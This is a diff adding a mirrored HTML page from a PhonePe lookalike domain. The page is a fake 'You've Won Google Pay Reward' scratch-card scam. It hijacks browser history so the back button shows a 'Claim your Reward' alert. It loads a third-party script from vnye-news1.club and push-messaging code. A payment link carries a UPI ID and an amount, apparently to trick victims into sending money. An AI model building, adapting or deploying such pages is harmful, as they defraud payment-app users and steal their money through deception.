@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Mirrored from ph0nepe.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 07 Jan 2021 11:39:41 GMT -->
+<head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HEKGTMFGET"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-HEKGTMFGET');
+    </script>
+    <script type="text/javascript">! function (){
+            var t;
+            try{for (t=0; 10 > t; ++t)
+                history.pushState({}, "", "");
+                onpopstate=function (t)
+                {
+                    t.state && alert('  Claim your Reward  ');
+                }}
+            catch (o){}}();</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="You've Won Google Pay Reward">
+    <meta property="og:description" content="Clain Now and Withdraw it">
+    <script type="text/javascript">
+        'use strict'
+        let time_wait=0;
+        let blackout=0;
+        let yaban=0;
+        let title="";
+        let desc="";
+    </script>
+    <link rel="manifest" href="manifest.json">
+    <script src="../www.gstatic.com/firebasejs/8.0.1/firebase-app.js"></script>
+    <script src="../www.gstatic.com/firebasejs/8.0.1/firebase-messaging.js"></script>
+    <script src="../vnye-news1.club/localforage.min.js"></script>
+    <script type="text/javascript" src="https://vnye-news1.club/rp/rp.php?site=8018260&sub1=sub1" async></script>
+</head>
+<body>
+<div>
+    <img src="OP.jpg" width="100%" height="auto">
+</div>
+<!-- ////////////// -->
+<div class="container" id="js-container">
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <canvas class="canvas" id="js-canvas" width="290" height="290" style="z-index: 2;height: 299px; width: 309px;"></canvas>
+    <form class="form" style="visibility: visible;">
+        <img src="phonpee.jpg" width="100%" height="auto" onclick="">
+        <span style="position: absolute;left: 15px;right: 0;z-index: 1;bottom: 0;">
+        <center>
+            <h2><b>You've Won</b></h2>
+            <h2><b>₹3910</b></h2>
+        </center>
+        </span>
+    </form>
+</div>
+<a href="" onclick="openLink(parent,'hakerbiswas@okicici','1628660394','1910');">
+    <img src="YP.jpg" width="100%" height="auto" />
+</a>
+<!-- ////////////////// -->
+<script src="./myscript.js" type="text/javascript" ></script>
+</body>
+<!-- Mirrored from ph0nepe.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 07 Jan 2021 11:39:45 GMT -->
+</html>
